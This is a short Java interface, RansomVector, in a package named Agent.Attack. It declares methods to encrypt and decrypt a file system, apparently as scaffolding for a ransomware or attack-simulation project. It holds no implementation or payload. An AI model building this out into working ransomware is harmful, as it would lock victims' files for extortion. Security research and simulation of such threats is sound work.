package Agent.Attack;

import Agent.exceptions.RansomwareException;

public interface RansomVector {
	public void encryptFileSystem() throws RansomwareException ;

	public void decryptFileSystem() throws RansomwareException;

}
